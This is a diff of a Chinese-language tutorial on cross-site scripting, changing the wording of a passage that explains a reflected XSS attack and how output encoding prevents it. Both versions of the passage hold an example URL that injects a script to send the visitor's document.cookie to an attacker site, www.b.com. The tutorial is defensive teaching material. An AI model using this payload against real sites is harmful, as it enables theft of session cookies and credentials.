@@ -34,7 +34,7 @@ XSS ：跨站脚本攻击（Cross Site Scripting）。为了区别于层叠样�
 </html>
 ```
 
-当我们访问地址 http://www.a.com/index.php?content=test 时，页面输出内容就是 test。这样好像并没有什么问题，但是，如果攻击者将访问地址修改为 http://www.a.com/index.php?content=&lt;script&gt;window.open("www.b.com?param="+document.cookie)&lt;/script&gt;， 问题就来了。当某人打开这个地址后，除了打开 www.a.com ,还会弹出一个新的窗口 www.b.com（攻击者的站点），并且带上他保存在本地的 cookie，这些 cookie 很可能包含了他的用户名、密码等私密信息，而这些信息都会被攻击者获取。
+当我们访问地址 http://www.a.com/index.php?content=test 时，页面输出内容就是 test。这样好像并没有什么问题，但是，如果攻击者将访问地址修改为 http://www.a.com/index.php?content=&lt;script&gt;window.open("www.b.com?param="+document.cookie)&lt;/script&gt;， 那么，问题就来了。当某人打开这个地址后，除了打开 www.a.com ，还会弹出一个新的窗口 www.b.com（攻击者的站点），并且带上他保存在本地的 cookie，这些 cookie 很可能包含了他的用户名、密码等私密信息，而这些信息都会被攻击者获取。
 
 （当然了，安装上面步骤操作一遍，我们不一定能看到上面所说的现象，那是因为有些浏览器会自带一些保护性措施来防止这种 XSS 攻击）
 
@@ -48,7 +48,7 @@ XSS 攻击大体分为以上两类：
 
 **归根结底，以上两类情况都是没有对用户提交的数据（参数）做过滤检查。所以，开发者应该有一个共识：永远不要相信用户的输入！对用户的输入进行过滤和审核是一个必要的环节！**
 
-依据以上分析，我们知道：**预防 XSS 攻击的核心就是在输出不可信数据的时候进行编码，过滤特殊字符。**
+所以，依据以上分析：**预防 XSS 攻击的核心就是在输出不可信数据的时候进行编码，过滤特殊字符。**
 
 ```
 <     ->  &lt;    
